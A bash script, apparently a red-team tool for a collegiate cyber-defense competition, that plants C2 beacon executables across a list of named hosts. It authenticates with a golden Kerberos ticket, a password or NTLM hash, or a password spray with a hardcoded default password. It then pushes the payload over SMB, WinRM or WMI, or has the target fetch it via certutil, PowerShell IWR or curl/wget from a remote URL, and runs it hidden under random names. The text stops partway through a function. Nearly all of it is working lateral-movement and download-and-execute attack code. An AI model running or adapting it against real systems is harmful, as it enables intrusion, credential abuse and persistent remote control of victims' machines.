#!/bin/bash
# ================================================
# CCDC Beacon Planter
# Usage: ./planter.sh <team> [host] [-p pass_or_hash] [-u user] [-w URL] [-x] [-b exe] [-v]
#
#   Plants C2 binaries on target(s). By default plants ALL .exe files
#   in CWD (e.g. session.exe + beacon.exe). Use -b to pick one.
#   Auth priority: golden ticket (team<N>.ccache) → -p cred → spray DA list
#   Transfer: SMB put → WMI copy → WinRM upload → certutil from URL → powershell IWR from URL
#   Exec order: SMB → WinRM → WMI → smbexec → SSH (for Linux boxes)
#   Drop paths: random temp name → C:\Windows\Temp → C:\ProgramData → %TEMP%
#
#   host  → hostname, number 1-7, or omit for ALL boxes
#   -p    → password or NTLM hash (overrides golden ticket)
#   -u    → user (default: Administrator)
#   -w    → fallback HTTP URL for beacon download if file transfer fails
#   -b    → specific exe to plant (default: all .exe in CWD)
#   -x    → use internal 172.16.x.x IPs (through proxychains)
#   -v    → verbose/debug output (show commands, timings, errors)
# ================================================

set -uo pipefail

usage() {
  echo "Usage: $0 <team> [host] [-p password_or_hash] [-u user] [-w http_url] [-b exe] [-x] [-v]"
  echo ""
  echo "  host can be:"
  echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
  echo "    number    — 1-7 (or omit to target ALL boxes)"
  echo ""
  echo "Flags:"
  echo "  -p PASS  password or NTLM hash"
  echo "  -u USER  specify user (default: Administrator)"
  echo "  -w URL   fallback HTTP URL to download beacon if file xfer fails"
  echo "  -b EXE   specific binary to plant (default: all .exe in CWD)"
  echo "  -x       use internal 172.16.x.x IPs (via proxychains)"
  echo "  -v       verbose mode (show commands, timings, nxc output)"
  echo ""
  echo "Examples:"
  echo "  $0 5                               # plant all .exe on all boxes"
  echo "  $0 5 1                             # plant on curiosity only"
  echo "  $0 5 -b session.exe                # plant only session.exe"
  echo "  $0 5 anger -p Th3cake1salie!"
  echo "  $0 5 -w http://10.0.0.5:8080/b.exe"
  exit 1
}

# ====================== PARSE ARGS ======================
if [[ $# -lt 1 ]]; then usage; fi

TEAM="$1"; shift
if [[ -z "$TEAM" || ! "$TEAM" =~ ^[0-9]+$ ]]; then usage; fi

DOMAIN="aperturesciencelabs.org"
PASS=""
USER_OVERRIDE=""
BEACON_URL=""
TARGET_ARG=""
TIMEOUT=1
USE_INTERNAL=0
SPECIFIC_BIN=""
VERBOSE=0

# Grab optional positional host arg (before flags)
if [[ $# -gt 0 && "$1" != -* ]]; then
  TARGET_ARG="$1"; shift
fi

while getopts "p:u:w:b:xv" opt; do
  case "$opt" in
    p) PASS="$OPTARG" ;;
    u) USER_OVERRIDE="$OPTARG" ;;
    w) BEACON_URL="$OPTARG" ;;
    b) SPECIFIC_BIN="$OPTARG" ;;
    x) USE_INTERNAL=1 ;;
    v) VERBOSE=1 ;;
    *) usage ;;
  esac
done

# ====================== HOST MAPPING ======================
declare -A NUM_HOST=(
  [1]="curiosity" [2]="morality" [3]="intelligence"
  [4]="anger" [5]="fact" [6]="space" [7]="adventure"
)
declare -A HOST_OCTET=(
  ["curiosity"]=140  ["morality"]=10  ["intelligence"]=11
  ["anger"]=70       ["fact"]=71      ["space"]=141
  ["adventure"]=72
)
declare -A HOST_INTERNAL=(
  ["curiosity"]="172.16.3.140"   ["morality"]="172.16.1.10"
  ["intelligence"]="172.16.1.11" ["anger"]="172.16.2.70"
  ["fact"]="172.16.2.71"         ["space"]="172.16.3.141"
  ["adventure"]="172.16.2.72"
)
HOST_ORDER=(curiosity morality intelligence anger fact space adventure)

# ====================== RESOLVE TARGETS ======================
TARGETS=()
if [[ -z "$TARGET_ARG" ]]; then
  for h in "${HOST_ORDER[@]}"; do
    TARGETS+=("$h")
  done
elif [[ "$TARGET_ARG" =~ ^[1-7]$ ]]; then
  TARGETS+=("${NUM_HOST[$TARGET_ARG]}")
elif [[ -n "${HOST_OCTET[$TARGET_ARG]:-}" ]]; then
  TARGETS+=("$TARGET_ARG")
else
  echo "[-] Unknown host: '$TARGET_ARG'"
  exit 1
fi

# ====================== FIND C2 BINARIES ======================
BEACON_FILES=()
if [[ -n "$SPECIFIC_BIN" ]]; then
  # User specified a particular binary
  if [[ -f "$SPECIFIC_BIN" ]]; then
    BEACON_FILES+=("$SPECIFIC_BIN")
  else
    echo "[-] Specified binary not found: $SPECIFIC_BIN"
    exit 1
  fi
else
  # Default: collect ALL .exe files in CWD
  for f in *.exe; do
    [[ -f "$f" ]] && BEACON_FILES+=("$f")
  done
fi

# Default C2 URL — used when no local .exe and no -w specified
DEFAULT_BEACON_URL="https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe"

if [[ ${#BEACON_FILES[@]} -eq 0 ]]; then
  echo "[!] No .exe found in current directory"
  if [[ -z "$BEACON_URL" ]]; then
    BEACON_URL="$DEFAULT_BEACON_URL"
    echo "[*] No -w URL specified — using default: $BEACON_URL"
  else
    echo "[*] Will rely on -w URL download only: $BEACON_URL"
  fi
  BEACON_FILES=("beacon.exe")  # placeholder name for URL-only mode
fi

# URL-only fast path: skip transfer cascade, fire one-liner download+exec
URL_ONLY=0
if [[ -n "$BEACON_URL" && ! -f "${BEACON_FILES[0]}" ]]; then
  URL_ONLY=1
fi

# Globals used by transfer functions — set per-binary in the plant loop
BEACON_FILE=""
BEACON_NAME=""
LAST_XFER=""  # method cache: reuse what worked for previous binary on same host

echo "[+] Binaries: ${BEACON_FILES[*]}"
if [[ $URL_ONLY -eq 1 ]]; then
  if [[ "${BEACON_URL,,}" == *.zip ]]; then
    echo "[+] Mode   : URL-only fast path (download+unzip+exec)"
  else
    echo "[+] Mode   : URL-only fast path (download+exec one-liner)"
  fi
fi
echo "[+] Targets : ${TARGETS[*]}"

# ====================== AUTH SETUP ======================
# Priority: golden ticket → explicit -p creds → spray DA list
# If golden ticket exists but fails auth, automatically falls back to password spray
DA_USERS=(Administrator caroline cave chell glados wheatley)
TICKET="team${TEAM}.ccache"
USE_KERBEROS=0
AUTH_FLAG=""
SPRAY_MODE=0
FALLBACK_PASS="Th3cake1salie!"

if [[ -z "$PASS" && -f "$TICKET" ]]; then
  echo "[+] Auth   : golden ticket ($TICKET) — will fallback to password spray if ticket fails"
  export KRB5CCNAME="$(pwd)/${TICKET}"
  USE_KERBEROS=1
  [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
elif [[ -n "$PASS" ]]; then
  # Detect hash vs password
  if [[ "$PASS" =~ ^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$ ]]; then
    AUTH_FLAG="-H"
    echo "[+] Auth   : hash"
  else
    AUTH_FLAG="-p"
    echo "[+] Auth   : password"
  fi
  [[ -z "$USER_OVERRIDE" ]] && USER_OVERRIDE="Administrator"
else
  echo "[+] Auth   : spray mode (DA accounts + users.txt, default pass)"
  SPRAY_MODE=1
  PASS="$FALLBACK_PASS"
  AUTH_FLAG="-p"
fi

# Build user list for spray mode AND for fallback
ALL_USERS=()
SPRAY_USERS=()

# Always build the spray user list (used as fallback if kerberos fails)
for u in "${DA_USERS[@]}"; do SPRAY_USERS+=("$u"); done
if [[ -f "users.txt" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && SPRAY_USERS+=("$u")
  done < "users.txt"
fi

if [[ $SPRAY_MODE -eq 1 ]]; then
  ALL_USERS=("${SPRAY_USERS[@]}")
  echo "[+] Spray  : ${#ALL_USERS[@]} users"
elif [[ $USE_KERBEROS -eq 1 ]]; then
  ALL_USERS=("$USER_OVERRIDE")
  echo "[+] Fallback users: ${#SPRAY_USERS[@]} (if ticket fails)"
else
  ALL_USERS=("$USER_OVERRIDE")
fi

echo ""

# ====================== HELPERS ======================

# Debug print — only shown with -v
dbg() { [[ $VERBOSE -eq 1 ]] && echo "      [DBG] $*" >&2; }

# Timer — returns seconds since epoch (with nanoseconds where available)
timer_now() { date +%s%N 2>/dev/null | head -c13 || date +%s; }
timer_diff() {
  local start="$1" end="$2"
  # If we got millisecond-precision timestamps (13 digits)
  if [[ ${#start} -ge 13 && ${#end} -ge 13 ]]; then
    local ms=$(( (end - start) ))
    echo "$(( ms / 1000 )).$(printf '%03d' $(( ms % 1000 )))s"
  else
    echo "$(( end - start ))s"
  fi
}

# Show netexec (or similar) output on failure when verbose
dbg_output() {
  local label="$1" rc="$2" out="$3"
  if [[ $VERBOSE -eq 1 ]]; then
    if [[ $rc -ne 0 ]] || ! echo "$out" | grep -qi '\[+\]'; then
      dbg "$label FAILED:"
      echo "$out" | head -5 | while IFS= read -r line; do
        echo "      [DBG]   $line" >&2
      done
    fi
  fi
}

declare -A PORT_CACHE
port_open() {
  local ip="$1" port="$2"
  local key="${ip}:${port}"
  if [[ -v PORT_CACHE["$key"] ]]; then
    dbg "port ${port} → cached ($([ ${PORT_CACHE["$key"]} -eq 0 ] && echo OPEN || echo CLOSED))"
    return ${PORT_CACHE["$key"]}
  fi
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
  PORT_CACHE["$key"]=$?
  dbg "port ${port} → $([ ${PORT_CACHE["$key"]} -eq 0 ] && echo OPEN || echo CLOSED)"
  return ${PORT_CACHE["$key"]}
}

# Generate a random-looking drop path (Windows)
random_drop_path() {
  local rnd=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
  local bases=(
    "C:\\Windows\\Temp\\svc${rnd}.exe"
    "C:\\ProgramData\\${rnd}.exe"
    "C:\\Windows\\System32\\Tasks\\${rnd}.exe"
  )
  echo "${bases[$((RANDOM % ${#bases[@]}))]}"
}

# Guaranteed-writable fallback paths in priority order
SAFE_PATHS=(
  'C:\Windows\Temp'
  'C:\ProgramData'
  '%TEMP%'
)

# ====================== NXC AUTH ARGS ======================
# Builds the auth portion of a netexec command for a given user
nxc_auth() {
  local user="$1"
  if [[ $USE_KERBEROS -eq 1 ]]; then
    echo "-u '$user' -d '$DOMAIN' -k"
  else
    echo "-u '$user' -d '$DOMAIN' $AUTH_FLAG '$PASS'"
  fi
}

# ====================== TRANSFER METHODS ======================
# Each returns 0 on success. They set REMOTE_PATH on success.

REMOTE_PATH=""

# Method 1: SMB put via smbclient then exec
transfer_smb_put() {
  local ip="$1" user="$2" dest="$3"
  [[ -z "$BEACON_FILE" ]] && { dbg "smb_put: no BEACON_FILE set"; return 1; }
  port_open "$ip" 445 || { dbg "smb_put: port 445 closed"; return 1; }

  local dest_dir dest_base share rel_path
  dest_base="$(basename "$dest")"

  # Try C$ admin share
  if [[ "$dest" == C:\\Windows\\Temp\\* || "$dest" == C:\\ProgramData\\* ]]; then
    rel_path="${dest#C:\\}"
    rel_path="${rel_path//\\/\/}"
    share="C\$"
  else
    share="C\$"
    rel_path="Windows/Temp/${dest_base}"
    dest="C:\\Windows\\Temp\\${dest_base}"
  fi

  dbg "smb_put: nxc smb $ip --put-file $BEACON_FILE $rel_path as $user"
  local out t0; t0=$(timer_now)
  if [[ $USE_KERBEROS -eq 1 ]]; then
    out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k \
      --put-file "$BEACON_FILE" "$rel_path" 2>&1)
  else
    out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
      --put-file "$BEACON_FILE" "$rel_path" 2>&1)
  fi
  dbg "smb_put: took $(timer_diff "$t0" "$(timer_now)")"

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  dbg_output "smb_put" 1 "$out"
  return 1
}

# Method 2: WinRM upload + write via PowerShell
transfer_winrm() {
  local ip="$1" user="$2" dest="$3"
  [[ -z "$BEACON_FILE" ]] && { dbg "winrm_xfer: no BEACON_FILE set"; return 1; }
  port_open "$ip" 5985 || { dbg "winrm_xfer: port 5985 closed"; return 1; }

  # base64-encode the file for inline transfer
  local b64
  b64=$(base64 -w0 "$BEACON_FILE" 2>/dev/null || base64 "$BEACON_FILE" 2>/dev/null)
  [[ -z "$b64" ]] && { dbg "winrm_xfer: base64 encode failed"; return 1; }

  dbg "winrm_xfer: b64 payload ${#b64} chars → $dest as $user"
  local ps_cmd="[IO.File]::WriteAllBytes('${dest}',[Convert]::FromBase64String('${b64}'))"

  local out t0; t0=$(timer_now)
  if [[ $USE_KERBEROS -eq 1 ]]; then
    out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k \
      -X "$ps_cmd" 2>&1)
  else
    out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" \
      -X "$ps_cmd" 2>&1)
  fi
  dbg "winrm_xfer: took $(timer_diff "$t0" "$(timer_now)")"

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  dbg_output "winrm_xfer" 1 "$out"
  return 1
}

# Method 3: Download from URL via certutil (executed over any working proto)
transfer_url_certutil() {
  local ip="$1" user="$2" dest="$3" proto="$4"
  [[ -z "$BEACON_URL" ]] && return 1

  local cmd="certutil -urlcache -split -f \"${BEACON_URL}\" \"${dest}\""
  local out t0

  dbg "certutil: $proto $ip → $dest"
  t0=$(timer_now)

  case "$proto" in
    smb)
      port_open "$ip" 445 || { dbg "certutil: port 445 closed"; return 1; }
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    winrm)
      port_open "$ip" 5985 || { dbg "certutil: port 5985 closed"; return 1; }
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    wmi)
      port_open "$ip" 135 || { dbg "certutil: port 135 closed"; return 1; }
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
      fi
      ;;
    *) return 1 ;;
  esac
  dbg "certutil ($proto): took $(timer_diff "$t0" "$(timer_now)")"

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  dbg_output "certutil($proto)" 1 "$out"
  return 1
}

# Method 4: Download from URL via PowerShell IWR
transfer_url_iwr() {
  local ip="$1" user="$2" dest="$3" proto="$4"
  [[ -z "$BEACON_URL" ]] && return 1

  local ps_cmd="powershell -NoP -NonI -c \"IWR -Uri '${BEACON_URL}' -OutFile '${dest}'\""
  local out t0

  dbg "iwr: $proto $ip → $dest"
  t0=$(timer_now)

  case "$proto" in
    smb)
      port_open "$ip" 445 || { dbg "iwr: port 445 closed"; return 1; }
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$ps_cmd" 2>&1)
      fi
      ;;
    winrm)
      port_open "$ip" 5985 || { dbg "iwr: port 5985 closed"; return 1; }
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$ps_cmd" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -X "$ps_cmd" 2>&1)
      fi
      ;;
    wmi)
      port_open "$ip" 135 || { dbg "iwr: port 135 closed"; return 1; }
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$ps_cmd" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$ps_cmd" 2>&1)
      fi
      ;;
    *) return 1 ;;
  esac
  dbg "iwr ($proto): took $(timer_diff "$t0" "$(timer_now)")"

  if echo "$out" | grep -qi '\[+\]'; then
    REMOTE_PATH="$dest"
    return 0
  fi
  dbg_output "iwr($proto)" 1 "$out"
  return 1
}

# ====================== EXECUTE BEACON ======================
exec_beacon() {
  local ip="$1" user="$2" path="$3" is_windows="${4:-1}"
  local cmd
  if [[ $is_windows -eq 1 ]]; then
    cmd="start /b \"\" \"${path}\""
  else
    cmd="chmod +x '${path}' 2>/dev/null; nohup '${path}' </dev/null &>/dev/null &"
  fi
  local out ok=1

  dbg "exec: attempting to run '$path' on $ip"

  # Try SMB
  if port_open "$ip" 445; then
    dbg "exec: trying nxc smb -x"
    local t0; t0=$(timer_now)
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    dbg "exec smb: took $(timer_diff "$t0" "$(timer_now)")"
    if echo "$out" | grep -qi '\[+\]'; then
      dbg "exec: SUCCESS via smb"
      return 0
    fi
    dbg_output "exec(smb)" 1 "$out"
  fi

  # Try WinRM
  if port_open "$ip" 5985; then
    dbg "exec: trying nxc winrm -x"
    local t0; t0=$(timer_now)
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    dbg "exec winrm: took $(timer_diff "$t0" "$(timer_now)")"
    if echo "$out" | grep -qi '\[+\]'; then
      dbg "exec: SUCCESS via winrm"
      return 0
    fi
    dbg_output "exec(winrm)" 1 "$out"
  fi

  # Try WMI
  if port_open "$ip" 135; then
    dbg "exec: trying nxc wmi -x"
    local t0; t0=$(timer_now)
    if [[ $USE_KERBEROS -eq 1 ]]; then
      out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$cmd" 2>&1)
    else
      out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$cmd" 2>&1)
    fi
    dbg "exec wmi: took $(timer_diff "$t0" "$(timer_now)")"
    if echo "$out" | grep -qi '\[+\]'; then
      dbg "exec: SUCCESS via wmi"
      return 0
    fi
    dbg_output "exec(wmi)" 1 "$out"
  fi

  # Try smbexec
  local smbexec_bin
  smbexec_bin=$(command -v smbexec.py 2>/dev/null || command -v impacket-smbexec 2>/dev/null || echo "")
  if [[ -n "$smbexec_bin" ]] && port_open "$ip" 445; then
    dbg "exec: trying $smbexec_bin"
    local t0; t0=$(timer_now)
    if [[ "$AUTH_FLAG" == "-H" ]]; then
      out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -hashes "$PASS" -c "$cmd" 2>&1)
    elif [[ $USE_KERBEROS -eq 1 ]]; then
      out=$("$smbexec_bin" "${DOMAIN}/${user}@${ip}" -k -no-pass -c "$cmd" 2>&1)
    else
      out=$("$smbexec_bin" "${DOMAIN}/${user}:${PASS}@${ip}" -c "$cmd" 2>&1)
    fi
    dbg "exec smbexec: took $(timer_diff "$t0" "$(timer_now)")"
    if echo "$out" | grep -qiv 'error\|failed\|refused\|denied'; then
      dbg "exec: SUCCESS via smbexec"
      return 0
    fi
    dbg_output "exec(smbexec)" 1 "$out"
  else
    dbg "exec: smbexec not available (bin='${smbexec_bin:-not found}')"
  fi

  # Try SSH
  if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
    dbg "exec: trying nxc ssh"
    local ssh_exec_cmd
    if [[ $is_windows -eq 1 ]]; then
      ssh_exec_cmd="start /b \"\" \"${path}\""
    else
      ssh_exec_cmd="chmod +x '${path}' 2>/dev/null; nohup '${path}' </dev/null &>/dev/null &"
    fi
    dbg "exec ssh cmd: $ssh_exec_cmd"
    local t0; t0=$(timer_now)
    out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$ssh_exec_cmd" 2>&1)
    dbg "exec ssh: took $(timer_diff "$t0" "$(timer_now)")"
    if echo "$out" | grep -qi '\[+\]'; then
      dbg "exec: SUCCESS via ssh"
      return 0
    fi
    dbg_output "exec(ssh)" 1 "$out"
  fi

  dbg "exec: ALL methods exhausted for $path on $ip"
  return 1
}

# ====================== URL ONE-LINER (fast path) ======================
# Single command: download + exec. No separate transfer/exec phases.
# Auto-detects .zip URLs: downloads, extracts, runs every .exe inside.
# Uses: ip, user, is_windows, BEACON_URL, BEACON_NAME, auth globals
url_exec_oneliner() {
  local ip="$1" user="$2" is_windows="${3:-1}"
  local rnd=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
  local out t0

  # Detect zip URL (case-insensitive check on extension)
  local is_zip=0
  [[ "${BEACON_URL,,}" == *.zip ]] && is_zip=1

  if [[ $is_windows -eq 1 ]]; then
    local dir="C:\\Windows\\Temp\\svc${rnd}"

    if [[ $is_zip -eq 1 ]]; then
      # --- ZIP MODE (Windows) ---
      # cmd: mkdir, certutil download, tar extract, delete zip, run all .exe
      local oneliner="mkdir \"${dir}\" & certutil -urlcache -split -f \"${BEACON_URL}\" \"${dir}\\p.zip\" >nul 2>nul & cd /d \"${dir}\" & tar -xf p.zip 2>nul & del /q p.zip 2>nul & for %f in (*.exe) do start /b \"\" \"${dir}\\%f\""
      # PowerShell: New-Item, IWR, Expand-Archive, run all .exe
      local oneliner_ps="\$d='${dir}';New-Item -ItemType Directory -Path \$d -Force|Out-Null;IWR -Uri '${BEACON_URL}' -OutFile \"\$d\\p.zip\";Expand-Archive \"\$d\\p.zip\" \$d -Force;Remove-Item \"\$d\\p.zip\" -Force;Get-ChildItem \"\$d\\*.exe\"|ForEach-Object{Start-Process \$_.FullName -WindowStyle Hidden}"
      local label_cmd="zip:certutil+tar+exec"
      local label_ps="zip:IWR+Expand-Archive+exec"
    else
      # --- EXE MODE (Windows) ---
      local drop="${dir}.exe"
      local oneliner="certutil -urlcache -split -f \"${BEACON_URL}\" \"${drop}\" >nul 2>nul & start /b \"\" \"${drop}\""
      local oneliner_ps="\$p='${drop}';IWR -Uri '${BEACON_URL}' -OutFile \$p;Start-Process \$p -WindowStyle Hidden"
      local label_cmd="certutil+exec"
      local label_ps="IWR+exec"
    fi
    local drop_display="${dir}"
    [[ $is_zip -eq 0 ]] && drop_display="${dir}.exe"

    # Try via SMB (cmd one-liner)
    if port_open "$ip" 445; then
      dbg "oneliner: nxc smb -x ${label_cmd}"
      t0=$(timer_now)
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" -k -x "$oneliner" 2>&1)
      else
        out=$(netexec smb "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$oneliner" 2>&1)
      fi
      dbg "oneliner smb: took $(timer_diff "$t0" "$(timer_now)")"
      if echo "$out" | grep -qi '\[+\]'; then
        echo "    [+] One-liner (${label_cmd} via smb) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
        return 0
      fi
      dbg_output "oneliner(smb/${label_cmd})" 1 "$out"
    fi

    # Try via WinRM (PowerShell one-liner)
    if port_open "$ip" 5985; then
      dbg "oneliner: nxc winrm -X ${label_ps}"
      t0=$(timer_now)
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" -k -X "$oneliner_ps" 2>&1)
      else
        out=$(netexec winrm "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -X "$oneliner_ps" 2>&1)
      fi
      dbg "oneliner winrm: took $(timer_diff "$t0" "$(timer_now)")"
      if echo "$out" | grep -qi '\[+\]'; then
        echo "    [+] One-liner (${label_ps} via winrm) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
        return 0
      fi
      dbg_output "oneliner(winrm/${label_ps})" 1 "$out"
    fi

    # Try via WMI (cmd one-liner)
    if port_open "$ip" 135; then
      dbg "oneliner: nxc wmi -x ${label_cmd}"
      t0=$(timer_now)
      if [[ $USE_KERBEROS -eq 1 ]]; then
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" -k -x "$oneliner" 2>&1)
      else
        out=$(netexec wmi "$ip" -u "$user" -d "$DOMAIN" $AUTH_FLAG "$PASS" -x "$oneliner" 2>&1)
      fi
      dbg "oneliner wmi: took $(timer_diff "$t0" "$(timer_now)")"
      if echo "$out" | grep -qi '\[+\]'; then
        echo "    [+] One-liner (${label_cmd} via wmi) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
        return 0
      fi
      dbg_output "oneliner(wmi/${label_cmd})" 1 "$out"
    fi

    # Try via SSH (Windows OpenSSH)
    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
      dbg "oneliner: nxc ssh -x ${label_cmd}"
      t0=$(timer_now)
      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$oneliner" 2>&1)
      dbg "oneliner ssh: took $(timer_diff "$t0" "$(timer_now)")"
      if echo "$out" | grep -qi '\[+\]'; then
        echo "    [+] One-liner (${label_cmd} via ssh) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
        return 0
      fi
      dbg_output "oneliner(ssh/${label_cmd})" 1 "$out"
    fi

  else
    # ---- Linux ----
    if [[ $is_zip -eq 1 ]]; then
      # --- ZIP MODE (Linux) ---
      local dir="/tmp/svc${rnd}"
      local dl_cmd="mkdir -p '${dir}'; curl -sSLo '${dir}/p.zip' '${BEACON_URL}' || wget -qO '${dir}/p.zip' '${BEACON_URL}'; cd '${dir}'; unzip -o p.zip 2>/dev/null || python3 -c \"import zipfile;zipfile.ZipFile('p.zip').extractall('.')\" 2>/dev/null; rm -f p.zip; chmod +x * 2>/dev/null; for f in *; do [ -f \"\$f\" ] && [ -x \"\$f\" ] && nohup ./\"\$f\" </dev/null &>/dev/null & done"
      local drop_display="${dir}/"
      local label="zip:curl+unzip+exec"
    else
      # --- EXE MODE (Linux) ---
      local drop="/tmp/svc${rnd}"
      local dl_cmd="curl -sSLo '${drop}' '${BEACON_URL}' || wget -qO '${drop}' '${BEACON_URL}'; chmod +x '${drop}'; nohup '${drop}' </dev/null &>/dev/null &"
      local drop_display="${drop}"
      local label="curl+exec"
    fi

    if port_open "$ip" 22 && [[ "$AUTH_FLAG" == "-p" ]]; then
      dbg "oneliner: nxc ssh linux ${label}"
      t0=$(timer_now)
      out=$(netexec ssh "$ip" -u "$user" -p "$PASS" -x "$dl_cmd" 2>&1)
      dbg "oneliner ssh: took $(timer_diff "$t0" "$(timer_now)")"
      if echo "$out" | grep -qi '\[+\]'; then
        echo "    [+] One-liner (${label} via ssh) → $drop_display  ($(timer_diff "$t0" "$(timer_now)"))"
        return 0
      fi
      dbg_output "oneliner(ssh/${label})" 1 "$out"
    fi
  fi

  echo "    [-] One-liner failed on all protocols"
  return 1
}

# ====================== TRANSFER + EXEC ONE BINARY ======================
# Called with: transfer_exec_one <ip> <user> <hostname> <authed_proto> <is_windows>
# Uses globals: BEACON_FILE, BEACON_NAME, USE_KERBEROS, AUTH_FLAG, PASS, LAST_XFER
transfer_exec_one() {
  local ip="$1" authed_user="$2" hostname="$3" authed_proto="$4" is_windows="${5:-1}"
  local t0_xfer; t0_xfer=$(timer_now)

  echo "    --- ${BEACON_NAME} ---"

  # ---- FAST PATH: URL-only mode → single download+exec command ----
  if [[ $URL_ONLY -eq 1 ]]; then
    dbg "URL_ONLY fast path — firing one-liner"
    if url_exec_oneliner "$ip" "$authed_user" "$is_windows"; then
      echo "    [+] PLANTED ${BEACON_NAME} on ${hostname}  ($(timer_diff "$t0_xfer" "$(timer_now)"))"
      return 0
    else
      echo "    [-] One-liner failed for ${BEACON_NAME} on ${hostname}  ($(timer_diff "$t0_xfer" "$(timer_now)"))"
      return 1
    fi
  fi

  dbg "file=$BEACON_FILE  size=$(stat -c%s "$BEACON_FILE" 2>/dev/null || echo '?') bytes"

  local rand_path
  rand_path=$(random_drop_path)
  local all_dests=("$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}")
  dbg "drop targets: ${all_dests[*]}"

  REMOTE_PATH=""
  local transferred=0

  # Build method order: cached method first → URL-first if -w given → file upload
  local methods=()
  [[ -n "$LAST_XFER" ]] && methods+=("$LAST_XFER")
  if [[ -n "$BEACON_URL" ]]; then
    methods+=(certutil iwr smb_put winrm)
  else
    methods+=(smb_put winrm certutil iwr)
  fi
  [[ "$authed_proto" == "ssh" ]] && methods+=(scp url_ssh)

  # Deduplicate (cached method may already be in the list)
  local seen=() unique=()
  for m in "${methods[@]}"; do
    local dup=0
    for s in "${seen[@]+"${seen[@]}"}"; do [[ "$s" == "$m" ]] && { dup=1; break; }; done
    [[ $dup -eq 0 ]] && { unique+=("$m"); seen+=("$m"); }
  done
  dbg "transfer order: ${unique[*]}$([ -n "$LAST_XFER" ] && echo " (cached=$LAST_XFER)" || true)"

  for method in "${unique[@]}"; do
    [[ $transferred -eq 1 ]] && break
    dbg "trying method: $method"
    case "$method" in
      smb_put)
        for dest in "${all_dests[@]}"; do
          if transfer_smb_put "$ip" "$authed_user" "$dest"; then
            echo "    [+] Transferred via SMB put → $REMOTE_PATH"
            LAST_XFER="smb_put"; transferred=1; break
          fi
        done ;;
      winrm)
